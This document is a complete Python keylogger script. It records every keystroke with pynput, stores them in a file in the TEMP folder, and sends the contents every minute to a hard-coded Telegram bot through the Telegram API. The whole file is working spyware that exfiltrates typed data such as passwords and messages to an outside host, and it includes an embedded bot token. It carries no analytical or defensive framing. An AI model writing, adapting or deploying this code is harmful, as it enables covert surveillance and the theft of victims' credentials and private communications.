import os
import time
import requests
from pynput.keyboard import Listener

# Telegram Bot Details
BOT_TOKEN = "7932149611:AAEIp4SKFf3OZRsAPSnDjgpwgXopF4IeMPU"  # Replace with your Bot Token
CHAT_ID = 5981148597  # Replace with your Chat ID

# Log file
LOG_FILE = os.path.join(os.getenv("TEMP"), "keylog.txt")

def send_telegram_message(message):
    """Send captured keystrokes to Telegram."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, data=data)

def log_keystrokes(key):
    """Capture keystrokes and save them to a log file."""
    key = str(key).replace("'", "")

    if key == "Key.space":
        key = " "
    elif key == "Key.enter":
        key = "\n"
    elif key == "Key.backspace":
        key = "[BACKSPACE]"
    
    with open(LOG_FILE, "a") as f:
        f.write(key)

def send_logs():
    """Read the log file and send contents to Telegram every X minutes."""
    while True:
        time.sleep(60)  # Send logs every 60 seconds
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                logs = f.read()
            
            if logs.strip():
                send_telegram_message(f"Keystroke Logs:\n{logs}")
                open(LOG_FILE, "w").close()  # Clear logs after sending

# Start Keylogger & Background Sender
from threading import Thread
Thread(target=send_logs, daemon=True).start()

with Listener(on_press=log_keystrokes) as listener:
    listener.join()
